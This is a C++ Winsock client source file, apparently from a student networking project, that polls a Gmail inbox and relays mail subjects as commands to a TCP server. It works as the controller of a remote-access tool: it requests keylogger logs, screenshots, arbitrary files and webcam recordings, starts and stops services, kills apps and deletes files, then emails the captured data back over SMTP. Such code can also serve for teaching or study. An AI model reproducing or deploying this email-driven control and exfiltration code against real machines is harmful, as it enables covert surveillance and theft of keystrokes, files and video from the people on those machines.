#include "client.h"

int main()
{
    cout << "========== CLIENT ==========" << endl;
    cout << "=== Step 1 - Set up DLL" << endl;
    SOCKET clientSocket;
    int port = 55555;
    WSADATA wsaData;
    int wsaerr;
    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0)
    {
        cout << "The Winsock dll not found" << endl;
        // return 0;
    }
    else
    {
        cout << "The Winsock dll found!" << endl;
        cout << "The status: " << wsaData.szSystemStatus << endl;
    }
    cout << "\n=== Step 2 - Set up Client Socket===" << endl;
    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        cout << "Error at socket(): " << WSAGetLastError() << endl;
        WSACleanup();
        // return 0;
    }
    else
        cout << "socket() is OK!" << endl;
    cout << "\n===Step 3 - Connect with Server" << endl;
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    string IPOfServer ;
    cout << "Input IPOfServer: ";
    cin >> IPOfServer;
    cin.ignore();
    InetPton(AF_INET, "127.0.0.1", &clientService.sin_addr.s_addr);
    clientService.sin_port = htons(port);
    if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR)
    {
        cout << "Client: connect() - Failed to connect." << endl;
        WSACleanup();
        // return 0;
    }
    else
    {
        cout << "Client: connect() is OK" << endl;
        cout << "Client: Can start sending and receiving data..." << endl;
    }
	cout << "\n=== Step 4 - Chat to the Server ===\n\n";

    CSMTPClient SMTPClient([](const std::string&){ return; });
    CIMAPClient IMAPClient([](const std::string& strLogMsg) { std::cout << strLogMsg << std::endl;  });
    SMTPClient.InitSession("smtp.gmail.com:465", EMAIL_ACCOUNT, EMAIL_PASSWORD,
                            CMailClient::SettingsFlag::ALL_FLAGS, CMailClient::SslTlsFlag::ENABLE_SSL);
    while (1)  
    {
        char messageFromServer[bufferSize] = {};
        char messageFromClient[bufferSize] = {};

        IMAPClient.InitSession("imap.gmail.com:993", EMAIL_ACCOUNT, EMAIL_PASSWORD,
            CMailClient::SettingsFlag::ALL_FLAGS, CMailClient::SslTlsFlag::ENABLE_SSL);

        std::string strSearch;
        bool bResRcvStr = IMAPClient.Search(strSearch, CIMAPClient::SearchOption::CUSTOMIZED);
        if (!bResRcvStr) {
            std::cout << "Search failed\n";
            break;
        }
        // std::cout << strSearch << " " << strSearch.length() << "\n";
        string mailIndex = IMAPClient.GetMailIndex(strSearch);
        // cout << mailIndex  << " " << mailIndex.length() << " mailindex\n";

        if (mailIndex == "") {
            bool bRes = IMAPClient.CleanupSession();
            cout << "No new mail\n";
            Sleep(1000);
            continue;
        }

        string strHeader, strBody;
        bResRcvStr = IMAPClient.GetHeaderString(mailIndex, strHeader);
        bResRcvStr = IMAPClient.GetBodyString(mailIndex, strBody);

        cout << bResRcvStr << "\n" << strHeader << "\n";
        string strSubject = stripAndLowerString(IMAPClient.GetSubject(strHeader));
        cout << "Subject get: " << strSubject << "\n";
        string strSender = stripString(IMAPClient.GetSender(strHeader));
        cout << "Sender get: " << strSender << "\n";
        
        // string tmp = cleanString(strSubject);
        //cout << "Please enter a message to send to the Server: ";
        //cin.getline(messageFromClient, 1024);

        strcpy(messageFromClient, strSubject.c_str());
        messageFromClient[strSubject.length()] = '\0';
        int byteCount = send(clientSocket, messageFromClient, bufferSize, 0);
        if (byteCount > 0) {
            cout << "Message sent: " << messageFromClient << endl;
            cout << "Message length: " << strlen(messageFromClient) << endl;
            cout << "Subject length: " << strSubject.length() << endl;
        }
        else WSACleanup();
        if (string(messageFromClient) == "capturescreen")
        {
            // Step 1: Receive the file size
            streamsize fileSize;
            recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
            // cout << "Expected file size: " << fileSize << " bytes" << endl;

            // Step 2: Prepare to receive the file in chunks
            ofstream outputFile("./output/received_image.bmp", ios::binary|ios::out);
            if (!outputFile.is_open()) {
                cout << "Failed to open file for writing" << endl;
                break;
            }

            char fileBuffer[bufferSize];
            streamsize totalReceived = 0;

            while (totalReceived < fileSize) {
                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
                if (bytesReceived > 0) {
                    outputFile.write(fileBuffer, bytesReceived);
                    totalReceived += bytesReceived;
                    cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
                }
                else if (bytesReceived == 0) {
                    cout << "Connection closed by server" << endl;
                    break;
                }
                else {
                    cout << "Error receiving file data" << endl;
                    break;
                }
            }

            outputFile.close();
            
            // sendMail(strSender, "PROJECT_MMT Capture Screen", "Day la buc anh da duoc chup!", "./output/received_image.bmp");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Capture Screen", "Day la buc anh da duoc chup!", "./output/received_image.bmp");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient) == "listservice")
        {
            // Step 1: Receive the file size from the server
            streamsize fileSize;
            int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
            if (result <= 0) {
                cout << "Error receiving file size or connection closed by server" << endl;
                continue;
            }
            cout << "Expected file size: " << fileSize << " bytes" << endl;

            // Step 2: Prepare to receive the file in chunks and save it as services.txt
            ofstream outputFile("./output/received_services.txt", ios::binary|ios::out);
            if (!outputFile.is_open()) {
                cout << "Failed to open received_services.txt for writing" << endl;
                continue;
            }

            // Receive the file content in chunks
            char fileBuffer[bufferSize];
            streamsize totalReceived = 0;

            while (totalReceived < fileSize) {
                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
                if (bytesReceived > 0) {
                    outputFile.write(fileBuffer, bytesReceived);
                    totalReceived += bytesReceived;
                    cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
                }
                else if (bytesReceived == 0) {
                    cout << "Connection closed by server" << endl;
                    break;
                }
                else {
                    cout << "Error receiving file data: " << WSAGetLastError() << endl;
                    break;
                }
            }
            outputFile.close();

            // sendMail(strSender, "PROJECT_MMT List Service", "Day la danh sach cac dich vu!", "./output/received_services.txt");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT List Service", "Day la danh sach cac dich vu!", "./output/received_services.txt");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient) == "startservice")
        {
            string serviceToStart = stripString(IMAPClient.GetContent(strBody, "Service name:"));
            // cout << "Name of service to start: ";
            // getline(cin, serviceToStart);
            send(clientSocket, serviceToStart.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);

            if (byteCount > 0) {
                cout << "Message received: " << messageFromServer << endl;
            }

            // sendMail(strSender, "PROJECT_MMT Start Service", messageFromServer, "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Start Service", messageFromServer, "");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient) == "stopservice")
        {
            string serviceToStop = stripString(IMAPClient.GetContent(strBody, "Service name:"));;
            send(clientSocket, serviceToStop.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);

            if (byteCount > 0) {
                cout << "Message received: " << messageFromServer << endl;
            }

            // sendMail(strSender, "PROJECT_MMT Stop Service", messageFromServer, "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Stop Service", messageFromServer, "");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient) == "keylogger")
        {
            string time = stripString(IMAPClient.GetContent(strBody, "Time:"));
            send(clientSocket, time.c_str(), bufferSize, 0);
            streamsize fileSize;
            int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
            if (result <= 0) {
                cout << "Error receiving file size or connection closed by server" << endl;
                continue;
            }
            cout << "Expected file size: " << fileSize << " bytes" << endl;

            // Step 2: Prepare to receive the file in chunks and save it as services.txt
            ofstream outputFile("./output/keylogger.txt", ios::binary|ios::out);
            if (!outputFile.is_open()) {
                cout << "Failed to open keylogger.txt for writing" << endl;
                // sendMail(strSender, "PROJECT_MMT Keylogger", "Failed to open keylogger.txt for writing!", "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Keylogger", "Failed to open keylogger.txt for writing!", "");
                if (bResSendMail) cout << "Send mail successfully\n";
                else cout << "Send mail failed\n";
                continue;
            }

            // Receive the file content in chunks
            char fileBuffer[bufferSize];
            streamsize totalReceived = 0;

            while (totalReceived < fileSize) {
                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
                if (bytesReceived > 0) {
                    outputFile.write(fileBuffer, bytesReceived);
                    totalReceived += bytesReceived;
                    cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
                }
                else if (bytesReceived == 0) {
                    cout << "Connection closed by server" << endl;
                    break;
                }
                else {
                    cout << "Error receiving file data: " << WSAGetLastError() << endl;
                    break;
                }
            }
            outputFile.close();        

            // sendMail(strSender, "PROJECT_MMT Keylogger", "Day la file keylogger da duoc ghi!", "./output/keylogger.txt"); 
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Keylogger", "Day la file keylogger da duoc ghi!", "./output/keylogger.txt");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient) == "listapp")
        {
            map<DWORD, string> gotApp;
            byteCount = receiveMap(clientSocket, gotApp);
            if (byteCount > 0)
            {
                cout << "Message received: " << "Got apps list successfully!" << endl;
            }
            else 
                WSACleanup();
            vector<string> imageName;
            receiveStringVector(clientSocket, imageName);
            int cnt = 1;
            auto iter = gotApp.begin();
            string body = "";
            for (auto x : imageName){
                cout << "App "  << cnt << ": " << x << ", PID: " << iter->first << endl;
                body += "App " + to_string(cnt) + ": " + x + ", PID: " + to_string(iter->first) + "\n";
                iter++; cnt++;
            }
            // sendMail(strSender, "PROJECT_MMT List App", body, "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT List App", body, "");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient).substr(0, 7) == "openapp")
        {
            string nameApp = stripString(IMAPClient.GetContent(strBody, "App name:"));
            send(clientSocket, nameApp.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
            if (byteCount > 0) {
                cout << "Message received: " << messageFromServer << endl;
                // sendMail(strSender, "PROJECT_MMT Open App", messageFromServer, "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Open App", messageFromServer, "");
                if (bResSendMail) cout << "Send mail successfully\n";
                else cout << "Send mail failed\n";
            }
            else 
                WSACleanup();
        }
        else if (string(messageFromClient).substr(0, 8) == "closeapp")
        {
            string appName = stripString(IMAPClient.GetContent(strBody, "App name:"));
            send(clientSocket, appName.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
            if (byteCount > 0) {
                cout << "Message received: " << messageFromServer << endl;
                // sendMail(strSender, "PROJECT_MMT Close App", messageFromServer, "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Close App", messageFromServer, "");
                if (bResSendMail) cout << "Send mail successfully\n";
                else cout << "Send mail failed\n";
            }
            else 
                WSACleanup();
        }
        else if (string(messageFromClient).substr(0, 10) == "deletefile")
        {
            string filePath = stripString(IMAPClient.GetContent(strBody, "File path:"));
            send(clientSocket, filePath.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
            if (byteCount > 0) {
                cout << "Message received: " << messageFromServer << endl;
                // sendMail(strSender, "PROJECT_MMT Delete File", messageFromServer, "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Delete File", messageFromServer, "");
                if (bResSendMail) cout << "Send mail successfully\n";
                else cout << "Send mail failed\n";
            }
            else 
                WSACleanup();
        }
        else if (string(messageFromClient).substr(0, 7) == "getfile")
        {
            std::string filePath, fileName;
            // std::cout << "Enter file path to request: ";
            // std::getline(std::cin, filePath);
            filePath = stripString(IMAPClient.GetContent(strBody, "File path:"));
            fileName = getFileName(filePath);
            std::string _filePath = escapeBackslashes(filePath);
            send(clientSocket, _filePath.c_str(), _filePath.size(), 0);
            receiveFile(clientSocket, fileName);
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Get File", "Day la file da duoc gui!", "./output/" + fileName);
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
        }
        else if (string(messageFromClient) == "startwebcam")
        {
            cout << "Recording...!" << endl;
            cout << "Enter 'stopWebcam' to stop!" << endl;
            // sendMail(strSender, "PROJECT_MMT Webcam", "Mo webcam thanh cong!", "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Webcam", "Mo webcam thanh cong!", "");
        }
        else if (string(messageFromClient) == "stopwebcam")
        {
            cout << "Stop now!" << endl;
            receiveFile(clientSocket, "output.mp4");
            // sendMail(strSender, "PROJECT_MMT Webcam", "Day la video da duoc ghi!", "./output/output.mp4");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Webcam", "Day la video da duoc ghi!", "./output/output.mp4");
        }
        // byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);

        // if (byteCount > 0) {
        //     cout << "Message received: " << messageFromServer << endl;
        // }
        // else WSACleanup();

        bool bRes = IMAPClient.CleanupSession();
        Sleep(1000);
    }

    bool cleanup = SMTPClient.CleanupSession();

    system("pause");
    WSACleanup();
    return 0;
}